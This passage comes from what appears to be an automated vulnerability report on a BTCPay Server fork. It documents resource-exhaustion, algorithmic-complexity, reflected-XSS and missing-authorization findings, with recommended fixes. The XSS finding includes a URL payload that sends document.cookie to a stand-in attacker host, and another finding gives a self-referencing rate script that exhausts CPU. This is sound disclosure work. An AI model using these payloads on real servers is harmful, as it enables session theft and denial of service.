7. [BTCPayServer.Rating/Providers/BackgroundFetcherRateProvider.cs:204–212](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Providers/BackgroundFetcherRateProvider.cs#L204-L212)
   When the cache is empty or past its validity the underlying provider is fetched inline on the request path (invoice creation, checkout, anonymous Bitpay GET /api/rates); after a failed fetch with no previous result Expiration is set to now (line 264), so every subsequent request re-fetches the hostile endpoint.
8. [BTCPayServer.Rating/Services/RateProviderFactory.cs:77–80](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Services/RateProviderFactory.cs#L77-L80)
   Every non-contextual provider is wrapped in a BackgroundFetcherRateProvider with RefreshRate 1 minute and ValidatyTime 5 minutes, which sets how often the hostile response is re-pulled.
9. [BTCPayServer/HostedServices/RatesHostedService.cs:49–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/RatesHostedService.cs#L49-L64)
   Scheduled every 30 s (BTCPayServerServices.cs:470); refreshes every provider requested within the last day via UpdateIfNecessary under a 20-second token — a bound on duration, not on bytes buffered, so a fast or compressed hostile body is pulled automatically about once a minute.

## Impact
Memory exhaustion of the single BTCPay process (OOM kill, or OutOfMemoryException surfacing in unrelated request and hosted-service code) denies checkout, invoice creation and the admin UI to all stores on the instance, including stores not using the hostile exchange; it recurs on every background refresh and on every inline fetch while the hostile response persists. No confidentiality or integrity impact beyond what a rate provider is already conceded by design.

## Reproduction steps
1. The attacker must control the HTTP response of one of the hard-coded exchange ticker endpoints: be or compromise the exchange, or hold a TLS machine-in-the-middle position with a certificate the container trusts — a position outside the attacker's unilateral control, hence AT:PRESENT. Once held, no privileges on BTCPay and no user interaction are needed: every instance with a store that used that exchange in the last day fetches it automatically about once a minute (RatesHostedService), and the inline path fetches it on invoice creation / anonymous /api/rates whenever the 5-minute cache is cold. The allocation is set by the attacker's response: raw bytes delivered within the 20 s (background) or 100 s (inline) window, or for Kraken a small gzip/brotli body inflated by AutomaticDecompression, all buffered up to the .NET default of int.MaxValue before a UTF-16 string and a Newtonsoft DOM are built on top.

## Recommended fix
Rate-provider HTTP responses are read with ReadAsStringAsync / GetAsync + ReadAsAsync<JObject>, which buffer and DOM-parse bodies of any size, and none of the HttpClients used by providers (the unnamed default client and the Kraken named client with AutomaticDecompression) sets a response-size limit. Fix criteria: Every rate-provider fetch must enforce a hard upper bound on the (decompressed) response body — a few MB is ample for any ticker payload — before and while reading, via MaxResponseContentBufferSize on every HttpClient a provider uses, or HttpCompletionOption.ResponseHeadersRead with a length-limited stream, or a shared size-limited reader used by all providers including the ExchangeSharp bridge; exceeding the bound must fail that fetch (surfacing as an ExchangeException via BackgroundFetcherRateProvider/WrapperRateProvider) with bounded memory use. Verify with a stub endpoint returning a body larger than the limit, and one returning a compressed body that inflates past it, that the fetch fails without buffering the whole body; additionally make HttpClientRequestMaker honour the caller's cancellation token so request-path fetches are cancelled when the request is aborted.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257585

---

# Rate rule flattening expands self-referencing scripts exponentially, pinning server threads and growing the shared error list without bound

## Details
The rate-rule DSL is compiled per query by RateRule's FlattenExpressionRewriter (BTCPayServer.Rating/RateRules.cs:460-511), which inlines every currency-pair identifier with the best matching rule and recurses into the result through CreateNewContext. The recursion is bounded only in depth (MaxNestedCount = 8; contexts with nested 0..8 recurse, nested 9 returns an error leaf) and not in breadth: every identifier in a candidate is expanded independently, nothing is memoised, cycles are not detected, and the shared-Errors short-circuit at line 492 is evaluated only after the inner subtree has already been visited, so a sibling identifier still recurses the full remaining depth.

A store owner (any registered user can create a store; threat model adversaries 2/4 explicitly list rate-rule scripts as hostile-tenant input) can store a script such as

    BTC_USD = BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD + BTC_USD;

(~90 characters). RateRules.TryParse (RateRules.cs:141-157) accepts it because every identifier is a valid currency pair; it never flattens or evaluates a rule, and both the UI save path (UIStoresController.Rates.cs:166) and Greenfield PUT /api/v1/stores/{storeId}/rates/configuration (GreenfieldStoreRatesConfigurationController.cs:198) rely on TryParse alone.

Whenever a rate for BTC_USD is requested for that store, RateFetcher.FetchRates -> SetQuery -> RateRules.GetRuleFor -> new RateRule(...) (RateFetcher.cs:65-71, RateRules.cs:521-526) flattens the rule synchronously on the calling thread-pool thread before any await, ignoring the CancellationToken. With fan-out k = 10 there are k^9 contexts at nested = 9 and k^10 = 10^10 leaf identifier visits, each performing parent.FindBestCandidate (list + LINQ ordering) and RateRules.CreateExpression, a full Roslyn CSharpSyntaxTree.ParseText (Microsoft.CodeAnalysis.CSharp 5.9.0), plus a further CreateExpression and HasBinaryOperations walk for every one of the ~k^9 intermediate returns. The request therefore never completes in practice (k = 20 gives 20^10 ~ 1e13). Each leaf also appends to the shared `Errors` List<RateRulesErrors> (line 478, shared by CreateNewContext at line 506), so process memory grows by one entry per leaf, slowly but without bound, until the list exceeds Array.MaxLength or the container is OOM-killed. (The intermediate syntax trees themselves are discarded by the line 492-495 replacement, so they do not accumulate.)

Triggers include: the anonymous Bitpay endpoint GET /api/rates?storeId=<id>&currencyPairs=BTC_USD (BitpayRateController.cs:105-152, no rate-limit zone), any invoice creation for the store (PoS, pay button, Greenfield, Bitpay) via UIInvoiceController.FetchRates -> InvoiceCreationContext.FetchingRates, the Greenfield rates and preview endpoints, the store's own Rates 'Test' button, and the OnChainRateTrackerHostedService, which calls FetchRates for the store on every new on-chain transaction (OnChainRateTrackerHostedService.cs:55-59) and would hang that shared hosted service. The attacker fires several such requests in parallel; each pins one thread-pool thread at 100% CPU indefinitely, starving invoice creation, checkout and the admin UI for every other store on the multi-tenant server. The script survives a restart, so the attack is repeatable at will.

The existing test (FastTests.CanParseRateRules, 'LTC_CHF = LTC_CHF * 1.01', expecting ERR_TOO_MUCH_NESTED_CALLS) only exercises a fan-out of 1 and so never observes the exponential case.

## Evidence
1. [BTCPayServer.Rating/RateRules.cs:460–510](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/RateRules.cs#L460-L510)
   FlattenExpressionRewriter.VisitIdentifierName: for every currency-pair identifier in a rule it calls parent.FindBestCandidate() and recursively flattens the candidate with a new context (CreateNewContext, nested+1, sharing the Errors list). The only guard is `nested > MaxNestedCount` (8), a depth bound; there is no bound on total work, no memoisation per pair and no cycle detection. The TooMuchNestedCalls check at line 492 runs only after the inner Visit, so sibling identifiers still expand the full remaining subtree. A rule referencing itself k times produces k^10 leaf visits, each a FindBestCandidate plus a Roslyn parse via CreateExpression (line 479) and an Errors.Add (line 478) on the shared list.
2. [BTCPayServer.Rating/RateRules.cs:141–156](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/RateRules.cs#L141-L156)
   TryParse is the only validation applied to a store's script. It parses the text (Script mode), normalises identifiers and rejects only non-currency identifiers / nested invocations. It never evaluates or flattens a rule, so a script whose flattening is exponential is accepted.
3. [BTCPayServer.Rating/Services/RateFetcher.cs:61–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Services/RateFetcher.cs#L61-L78)
   FetchRates calls rateRules.GetRuleFor(p) synchronously for every requested pair (SetQuery) on the caller's thread before any await. GetRuleFor constructs a RateRule whose constructor (RateRules.cs:521-526) performs the full flatten; the CancellationToken is not consulted during flattening.
4. [BTCPayServer/Data/StoreBlob.cs:122–135](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/StoreBlob.cs#L122-L135)
   RateSettings.GetRateRules re-parses the stored RateScript with TryParse on every rate query and returns it; the stored script is used unchanged for all rate fetches of the store.
5. [BTCPayServer/Controllers/UIStoresController.Rates.cs:163–175](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStoresController.Rates.cs#L163-L175)
   Saving a custom script in the UI only requires RateRules.TryParse to succeed (the view model's MaxLength(2000) is far more than the ~90 characters a k=10 self-referencing rule needs, and line 175 removes the Script model-state entry anyway).
6. [BTCPayServer/Controllers/GreenField/GreenfieldStoreRatesConfigurationController.cs:191–205](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoreRatesConfigurationController.cs#L191-L205)
   Greenfield PUT /api/v1/stores/{storeId}/rates/configuration also validates only with TryParse and imposes no length limit on EffectiveScript (StoreRateConfiguration has no MaxLength), so arbitrarily large scripts can also be stored.
7. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayRateController.cs:105–152](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayRateController.cs#L105-L152)
   [AllowAnonymous] GET /api/rates?storeId=...&currencyPairs=... loads the named store's rules and calls FetchRates for the supplied pairs with no rate-limit zone, so the flatten of the hostile script can be triggered repeatedly and unauthenticated (also reached through invoice creation: UIInvoiceController.cs:249-250,299-303 -> InvoiceCreationContext.FetchingRates, the Greenfield rates endpoints, and the store's own Test action).
8. [BTCPayServer/HostedServices/OnChainRateTrackerHostedService.cs:53–58](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/OnChainRateTrackerHostedService.cs#L53-L58)
   The shared hosted service calls FetchRates with the store's own rate rules on every new on-chain transaction to the store's wallet, so the hostile script also stalls this background service for all stores once the attacker's wallet receives a transaction.

## Impact
Each triggering request pins a thread-pool thread at full CPU for an effectively unbounded time (k^10 Roslyn parses) and grows the shared Errors list by one entry per leaf; a hostile tenant can therefore drive the multi-tenant server to CPU starvation (and eventually memory exhaustion), denying checkout, invoice creation, rate tracking and the admin UI to all stores and users of the instance. No confidentiality or integrity impact.

## Reproduction steps
1. Attacker registers (or already has) an account, creates a store (CanModifyStoreSettingsUnscoped is granted to any authenticated user) and saves a ~90-character self-referencing rate script through the store Rates UI or Greenfield PUT /rates/configuration; only RateRules.TryParse is applied, which never flattens. They then issue GET /api/rates?storeId=<their store>&currencyPairs=BTC_USD (anonymous, no rate-limit zone) or create invoices in their own store. Each request performs ~10^10 Roslyn parses synchronously on a thread-pool thread with no cancellation; a handful of concurrent requests saturate every core of the shared server. No defences stand in the way and no victim interaction is needed.

## Recommended fix
1. FlattenExpressionRewriter bounds only recursion depth; it has no bound on the total number of expansions, no memoisation of already-flattened pairs and no cycle detection, so breadth-times-depth growth is exponential and runs synchronously without cancellation. Fix criteria: Flattening any accepted script must complete in time and memory polynomial (ideally linear) in the script size: e.g. enforce a global node/expansion budget per GetRuleFor that yields a rule error when exceeded, memoise the flattened expression per pair within one flatten, and/or refuse rules whose dependency graph is cyclic. Verify that a rule referencing itself 20 times, requested through /api/rates and invoice creation, returns an error promptly without measurable CPU or memory growth.
2. Scripts are accepted on TryParse alone; nothing at save time exercises the rule flattening, and the Greenfield API imposes no length limit on EffectiveScript. Fix criteria: Script validation (UI and Greenfield) must reject scripts whose rules cannot be flattened within the enforced budget, and must enforce the same maximum script length on the Greenfield configuration endpoints as on the UI. Verify that the PUT /rates/configuration call with the self-referencing script above is rejected.

---
**Severity:** HIGH
**Status:** Open
**Category:** Algorithmic complexity
**CWE:** [CWE-407](https://cwe.mitre.org/data/definitions/407.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257584

---

# Reflected XSS: query-bound StoreReportsViewModel.Result reaches datatable.js eval()

## Details
The store Reports page trusts a server-authored list of chart filter expressions and eval()s them in the browser (datatable.js applyFilters). The page explicitly enables 'unsafe-eval' in its CSP for this purpose. The assumption that these strings are always server-authored is broken by the UI controller: `UIReportsController.StoreReports` is a GET action whose parameter `StoreReportsViewModel model` is populated by MVC model binding from the query string, and the view model exposes the whole response DTO `StoreReportResponse Result` as a bindable property. On the path where the search string has no explicit `timezone` filter, the action returns `View(model)` without ever calling the report provider, so `Model.Result` is exactly what the attacker put in the URL. The view embeds it in `srv.result`, and store-reports.js feeds `srv.result.charts[*].filters` to eval().

Attack: send a store member who holds `btcpay.store.canviewreports` (store Owner/Manager/Employee, or any server admin via CanViewStoreSettings) a link such as
`/stores/<storeId>/reports?Result.Data[0].x=1&Result.Charts[0].Filters[0]=1;}fetch('https://attacker/'+document.cookie);window.stop();function z(){return 1`
(no SearchTerm containing `timezone:`). The page renders, `Safe.Json` emits the payload as a JSON string, store-reports.js reaches `createTable` -> `applyFilters` -> `eval('function filter() {return 1;}fetch(...);window.stop();function z(){return 1;}')`, and the attacker's JavaScript executes in the victim's authenticated BTCPay session on the same origin. The payload runs synchronously in the same DOMContentLoaded dispatch as the page's auto 'set-timezone' re-submit, and can cancel that navigation (`window.stop()`), so it is not raced away. 'script-src self unsafe-eval' permits the eval; connect-src is unrestricted.

The store id in the URL must be one the victim can view reports for; store ids are not secret (e.g. anonymous checkout `GET /i/{invoiceId}/status` returns CheckoutModel.StoreId, `embed/{storeId}/{cryptoCode}/ln` is public, and any lesser store member already knows it). From the victim's session the attacker can read store settings, API keys and invoices, and perform state-changing requests (antiforgery tokens are readable same-origin): change payout/wallet/webhook settings, create API keys, or, against a server admin, change server policies.

Root cause: a response DTO is exposed as a model-bound input (mass assignment, CWE-915) and later used as trusted code (CWE-95), yielding reflected XSS (CWE-79). The lead e8-datatable-eval asked whether `filters` are ever user-derived: on this early-return path they are.

## Evidence
1. [BTCPayServer/Controllers/UIReportsController.cs:51–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIReportsController.cs#L51-L78)
   GET stores/{storeId}/reports binds the complex parameter `StoreReportsViewModel? model` from the query string (ASP.NET Core ParameterBinder falls back to the empty prefix when no `model` prefix is present; the page's own form posts unprefixed SearchTerm/SearchText/FilterCommand and relies on this). When the combined search string carries no `timezone` filter (lines 61-62) the action returns `View(model)` before `model.Result` is overwritten by the server-generated report (line 77), so every property of `model.Result` (fields, data, charts[].filters) is whatever the URL supplied.
2. [BTCPayServer/Models/StoreReportsViewModels/StoreReportsViewModel.cs:8–14](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Models/StoreReportsViewModels/StoreReportsViewModel.cs#L8-L14)
   `Result` (type StoreReportResponse, a response DTO from BTCPayServer.Client with public setters and no [BindNever]/[BindingBehavior(Never)]) is a bindable public property of a GET-bound view model; only `Search` and `CurrentPageCount` are excluded from binding (BasePagingViewModel.cs:32-34,134-136).
3. [BTCPayServer/Views/UIReports/StoreReports.cshtml:188–194](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIReports/StoreReports.cshtml#L188-L194)
   The view serialises `result = Model.Result` into the page's `srv` object with Safe.Json (HTML-escaped JSON, so the string survives intact) and line 8 calls `Csp.UnsafeEval()`, adding 'unsafe-eval' to script-src for this page. No connect-src restriction is set by the AntiXSS template (Filters/ContentSecurityPolicyAttribute.cs:20-29), so exfiltration is also possible.
4. [BTCPayServer/wwwroot/js/datatable.js:166–183](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/js/datatable.js#L166-L183)
   applyFilters() builds JavaScript source by string concatenation from `summaryDefinition.filters` and passes it to eval(). Any string in `charts[i].filters` is executed as code at eval time (e.g. `1;}<payload>;function x(){return 1`), independent of whether any row exists.
5. [BTCPayServer/wwwroot/js/store-reports.js:84–94](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/js/store-reports.js#L84-L94)
   On DOMContentLoaded the script clones `srv.result.data` (must be a non-null array; achieved via e.g. `Result.Data[0].x=1`, which the CollectionModelBinder turns into a list holding an empty JArray) and then calls createTable() for every entry of `srv.result.charts`, reaching the eval above with attacker-controlled filters.
6. [BTCPayServer.Client/Models/StoreReportResponse.cs:44–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Client/Models/StoreReportResponse.cs#L44-L52)
   ChartDefinition.Filters is a plain List<string> with a public setter, bindable as `Result.Charts[0].Filters[0]=<js>`; Groups/Totals/Aggregates default to empty lists so createTable() does not fail before applyFilters().

## Impact
Arbitrary JavaScript runs in the authenticated merchant/admin session on the BTCPay origin: the attacker can read every page the victim can (store settings, API keys, invoices, PII), and issue same-origin state-changing requests with the page's antiforgery token (wallet/payout/webhook settings, API key creation, server policies for an admin). Availability is not meaningfully affected.

## Reproduction steps
1. An attacker with no account crafts a GET URL to the reports page of a store (store ids are exposed publicly in CheckoutModel.StoreId and embed/{storeId}/{cryptoCode}/ln, and are known to any member) such as `?Result.Data[0].x=1&Result.Charts[0].Filters[0]=<js>` with no `timezone:` filter, and gets a cookie-authenticated victim holding CanViewReports on that store to open it. Model binding populates Result (StoreReportsViewModel.Result has no [BindNever]; the custom DefaultModelBinderProvider only intercepts decimal/PaymentMethodId/WalletId); the controller's early-return path renders it; Safe.Json (Newtonsoft, EscapeHtml) emits the string intact; store-reports.js passes charts[].filters to datatable.js applyFilters, which eval()s it. The page itself adds 'unsafe-eval' to script-src and the AntiXSS template sets no default-src/connect-src, so the payload runs and can exfiltrate. The payload runs in the same DOMContentLoaded dispatch as the page's timezone auto-resubmit, so it is not raced away. Assumptions: ASP.NET Core 10 MVC default model binding (empty-prefix fallback for action parameters; indexed collection binding for List<ChartDefinition>/List<string>/List<JArray>), and Newtonsoft.Json serializing an empty JArray as []. Works against default deployments; only `nocsp` would change the CSP, and it only loosens it.

## Recommended fix
1. StoreReportsViewModel exposes the server-generated StoreReportResponse (Result) as a public, model-bindable property of a GET-bound view model, so the query string can supply report fields, data and chart filter expressions (mass assignment of a response DTO). Fix criteria: Request-bound view models must not accept server-only output: `Result` (and InvoiceTemplateUrl/ExplorerTemplateUrls/AvailableViews) are excluded from model binding (e.g. [BindNever]/[BindingBehavior(Never)] or a separate input model), and the action always assigns Result from the server on every path that renders the view. Verify: a request with `Result.Charts[0].Filters[0]=...` renders a page whose `srv.result` is null/server-generated and contains no attacker string.
2. datatable.js evaluates chart filter strings with eval(), so any string reaching `charts[].filters` becomes executable code, and the page relaxes CSP with 'unsafe-eval' to allow it. Fix criteria: Chart filters are expressed as data (e.g. a declarative structure or a fixed set of named predicates implemented in JS) and no report-derived string is ever evaluated as code; 'unsafe-eval' is no longer required on the page. Verify: with an attacker-controlled filter string the page shows no script execution and the Reports CSP no longer contains 'unsafe-eval'.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257583

---

# AppHub lets anonymous clients subscribe to live payment events of any app

## Details
The SignalR hub mapped at /apps/hub is anonymous (Startup.cs:374, no RequireAuthorization). Its subscription method AppHub.ListenToCrowdfundApp(appId) joins the connection to the group whose name is the caller-supplied appId without verifying anything about the app or the caller (AppHub.cs:28-37). AppHubStreamer then fans out to that group, for every InvoiceEvent whose invoice carries the APP#appId internal tag (AppHubStreamer.cs:34-63): PaymentReceived with the payment's value, currency and payment method, and InfoUpdated carrying AppService.GetInfo(appId); InfoUpdated is also pushed whenever the merchant saves the app (AppUpdated).

Two information leaks follow:

1. Point-of-Sale apps. PoS appIds are public (the path of the public PoS page, /apps/{appId}/pos) and PoS invoices are tagged APP#appId (UIPointOfSaleController.cs:421). Anyone who joins the group receives a real-time feed of every payment made through that merchant's PoS (amount, currency, on-chain vs Lightning). No anonymous HTTP endpoint exposes this: the PoS recent-transactions endpoint requires CanViewInvoices (UIPointOfSaleController.cs:566) and the PoS front-end never uses the hub. (PointOfSalePlugin.GetInfo returns null, so InfoUpdated is null for PoS, but PaymentReceived still fires.)

2. Disabled / unpublished crowdfunds. ViewCrowdfund hides a crowdfund with Enabled=false from everyone except store members with CanModifyStoreSettings (UICrowdfundController.cs:82-88). The hub applies no such rule: a client that knows the appId (unguessable 20 random bytes, so one that was public before being disabled, or leaked via a link) receives the complete ViewCrowdfundViewModel - title, description, perks with prices and remaining inventory, target, raised amounts, dates - on every invoice event of that app or settings save, plus every payment. If the app has TagAllInvoices (crowdfund 'UseAllStoreInvoices'), every invoice of the store is tagged (UIInvoiceController.cs:280-283) and all of the store's payments are streamed.

For an enabled crowdfund the same stream is intended (the public page shows 'New payment of X' toasts), so the gain over the sanctioned path is the PoS feed and the disabled-crowdfund content. Root cause: group membership is granted on an attacker-chosen string with no authorization or publication check, and the streamer publishes without applying the access rule the HTTP surface enforces. Confidentiality impact is limited to payment amounts/methods and campaign content, hence low.

## Evidence
1. [BTCPayServer/Services/Apps/AppHub.cs:28–37](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppHub.cs#L28-L37)
   ListenToCrowdfundApp(appId) adds the (anonymous) SignalR connection to the group named by the caller-supplied appId with no check that the app exists, is a crowdfund, is Enabled/public, or that the caller holds any store permission.
2. [BTCPayServer/Services/Apps/AppHubStreamer.cs:34–63](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppHubStreamer.cs#L34-L63)
   On every InvoiceEvent, for each APP# internal tag of the invoice, pushes PaymentReceived (payment value, currency, pretty name, payment method id) to group appId when the event is ReceivedPayment, then InfoUpdated with AppService.GetInfo(appId); also InfoUpdated on AppUpdated. App type, Enabled state and subscriber identity are never consulted.
3. [BTCPayServer/Hosting/Startup.cs:374–376](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L374-L376)
   AppHub is mapped at /apps/hub with no RequireAuthorization, in contrast to MapBlazorHub().RequireAuthorization() two lines below; the hub is reachable by any anonymous client.
4. [BTCPayServer/Services/Apps/AppService.cs:82–91](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L82-L91)
   GetInfo loads any non-archived app by id (GetApp with appType null) and returns the type's full info object; for crowdfunds this is the complete ViewCrowdfundViewModel regardless of settings.Enabled; for PoS it is null (PointOfSalePlugin.GetInfo), so PoS leaks only PaymentReceived.
5. [BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs:194–241](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs#L194-L241)
   The pushed model contains title, tagline, description, perks (titles, prices, inventory), target, raised/pending amounts, per-perk counts/values, sounds, form URL and dates - the unpublished campaign content and statistics.
6. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:82–87](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L82-L87)
   The HTTP path returns 404 for a disabled crowdfund unless the caller is a store member with CanModifyStoreSettings (GetAppDataIfOwner) - the confidentiality boundary the hub path does not apply.
7. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:566–568](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L566-L568)
   The only HTTP endpoint exposing PoS payment activity (recent-transactions) requires the CanViewInvoices cookie policy; the PoS front-end never uses the hub, so the live PoS payment feed is otherwise never public.
8. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:421](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L421)
   PoS invoices are created with the APP#appId internal tag, so their payment events are fanned out to the group named by the public PoS appId.
9. [BTCPayServer/Controllers/UIInvoiceController.cs:280–283](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L280-L283)
   Every invoice of a store is additionally tagged APP#appId for each app with TagAllInvoices (crowdfund 'UseAllStoreInvoices'), so for such an app the hub streams payments of all the store's invoices, not just the app's own.
10. [BTCPayServer/wwwroot/crowdfund/services/listener.js:4–30](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/crowdfund/services/listener.js#L4-L30)
   The public crowdfund page connects to /apps/hub and calls ListenToCrowdfundApp(srvModel.appId); the same calls can be made by any client with any appId.

## Impact
Discloses a store's real-time payment activity (amount, currency, method per payment) for PoS apps and the full content and statistics of non-public crowdfund campaigns. No integrity or availability impact.

## Reproduction steps
1. Anonymous network client opens a SignalR connection to /apps/hub, invokes ListenToCrowdfundApp with the target appId (public for PoS; previously public or leaked for a disabled crowdfund) and passively receives PaymentReceived and InfoUpdated messages. No authentication, interaction or special deployment state required.

## Recommended fix
ListenToCrowdfundApp joins any caller to any group name, and AppHubStreamer publishes payment and info events for every tagged app regardless of app type or Enabled state. Fix criteria: Group subscription must be refused unless the appId names an existing, enabled crowdfund app whose public page is viewable (or the connection's user holds the permission ViewCrowdfund requires for disabled ones), and the streamer must only publish for apps whose public page is visible (skip non-crowdfund types and disabled crowdfunds). Verify by subscribing anonymously with a PoS appId and with a disabled crowdfund appId and confirming no PaymentReceived/InfoUpdated messages are delivered, while an enabled crowdfund page still receives them.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257452

---

# BitId authentication reads entire unauthenticated request body into a string before verifying

## Details
BitpayAuthenticationHandler.CheckBitId (BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs:70-83) runs for any request to a controller whose [Authorize] names the Bitpay scheme as soon as the request carries both an `x-identity` and an `x-signature` header (TryGetBitpayAuth, BitpayExtensions.cs:15-26; HandleAuthenticateAsync lines 43-45). Before anything is verified it calls `Request.EnableBuffering()` (no buffer limit: a FileBufferingReadStream that keeps 30 KB in memory and spills the rest to the temp directory) and then `new StreamReader(Request.Body).ReadToEndAsync()`, accumulating the decoded body in a StringBuilder and materialising it as one .NET string so it can be concatenated with the URL for the BitId hash. The only guard is `ContentLength != 0`, which a chunked body (ContentLength null) also passes. `new PubKey(id)` and CheckBitIDSignature run only afterwards (86-87) and their failures are swallowed, so the header values can be garbage.

